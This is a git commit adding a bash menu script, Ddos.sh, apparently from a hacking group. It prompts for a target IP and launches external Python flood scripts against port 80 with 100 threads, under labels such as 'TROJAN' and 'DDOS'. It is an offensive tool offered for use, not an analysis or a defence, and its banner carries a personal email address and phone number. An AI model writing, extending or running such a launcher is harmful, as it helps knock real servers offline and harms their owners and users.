2e1f25f3aef60f49bab45a76852c2e514a1bce40
EUCT <57327818+EUCT@users.noreply.github.com>
2019-11-05 04:37:05 +0700

    Add files via upload

---
+++ Ddos.sh
@@ -0,0 +1,52 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f slant " DDOS CR45H  TROJAN " |lolcat
+echo
+echo
+echo $blue"---------------------------------------"
+echo $blue"AUTOUR  :Mr CR45H  / Exploit Union Cyber Team "
+echo $blue"VERSION :1.0"
+echo $blue"JUDUL     :DDOS CR4SH TROJAN "
+echo $red"---------------------------------------"
+echo $green"?Contact :mpapajahat2333@gmail.com   "
+echo $green"?WhatsApp:+6285755365813             "
+echo $green"?Message :Gunakan Tools Ini Dengan Bijak  "
+echo $red"---------------------------------------"
+echo $yellow"                 OMOM"
+echo $red"---------------------------------------"
+echo $white"[1].CR45H  TROJAN"
+echo $white"[2].CR45H  DROID"
+echo $white"[3].CR45H  DDOS"
+echo $white"[4].CR45H  HAMMER"
+echo $white"[5].CR45H  VIRUS"
+echo $white"[0].EXIT"
+echo $red"---------------------------------------"
+echo $red"MASUKAN PILIHAN ANDA"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " CR45H  TROJAN " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " CR45H  DROID " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
